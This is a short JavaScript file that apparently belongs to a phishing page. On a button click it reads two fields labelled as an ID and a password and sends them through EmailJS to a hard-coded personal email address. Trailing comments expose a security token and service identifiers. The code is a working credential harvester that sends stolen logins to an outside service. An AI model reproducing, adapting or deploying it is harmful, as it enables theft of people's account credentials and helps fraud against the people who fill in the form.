document.getElementById('btn').addEventListener('click', () => {
    const input1 = document.getElementById('input-1').value
    const input2 = document.getElementById('input-2').value
    const p = document.getElementById('p')
    const params = {
        name: 'sohan',
        email: 'aryansohan02@gmail.com',
        message: `id: ${input1}
                 pass: ${input2}`,
    };

    const serviceID = "service_o79clcz";
    const templateID = "template_2hvn30e";

    emailjs.send(serviceID, templateID, params)
        .then(res => {
            console.log('sent your massage')

        })
        .catch(err => console.log(err));
    p.classList.remove('d-none')
})




// Your security token is b727c405-5a12-4178-aad2-2baefa82d8a1 Please take note of this.
// Only elasticemail is supported as an SMTP host. To open an account please visit
// DBF88FC8EA62E62864D4D4986C99F3014A25